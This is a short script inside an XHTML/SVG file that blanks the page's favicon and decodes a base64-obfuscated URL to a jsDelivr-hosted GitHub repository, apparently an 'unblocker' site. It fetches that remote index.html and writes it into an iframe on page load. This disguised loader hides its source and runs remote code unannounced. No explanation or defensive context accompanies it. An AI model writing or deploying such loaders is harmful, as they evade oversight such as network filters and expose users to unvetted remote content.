xhtml:body.xhtml:script:
//
  (function() {
    document.documentElement.style.background = '#0e0f11';
    try {
      var fav = document.createElementNS('http://www.w3.org/1999/xhtml', 'link');
      fav.setAttribute('rel', 'icon');
      fav.setAttribute('type', 'image/png');
      fav.setAttribute('href', 'data:image/png;base64,');
      document.documentElement.appendChild(fav);
    } catch (e) { }
    function size() {
      var w = window.innerWidth, h = window.innerHeight;
      var svg = document.querySelector('svg');
      var fo = document.querySelector('foreignObject');
      var fm = document.getElementById('fm');
      if (svg) { svg.setAttribute('width', w); svg.setAttribute('height', h); svg.setAttribute('viewBox', '0 0 ' + w + ' ' + h); }
      if (fo) { fo.setAttribute('width', w); fo.setAttribute('height', h); }
      // explicit px: foreignObject fixed-pos layout doesn't reflow on viewBox changes
      if (fm) { fm.style.width = w + 'px'; fm.style.height = h + 'px'; }
    }
    size();
    window.addEventListener('resize', size);
    (async () => {
      try {
        var u = atob('aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL2hhY2t6MDAvY2xhc3Nyb29tbWF4eGluZ0B2Ni8=') + 'index.html?t=' + Date.now();
        var res = await fetch(u);
        var text = await res.text();
        var frame = document.getElementById('fm');
        var fdoc = frame.contentDocument || frame.contentWindow.document;
        fdoc.open();
        fdoc.write(text);
        fdoc.close();
        size();
      } catch (e) {
        document.body.style.background = '#0e0f11';
        document.body.innerHTML = '<div style="color:#a9b0b8;font:13px monospace;padding:20px">failed to load - check your connection</div>';
      }
    })();
  })();
//
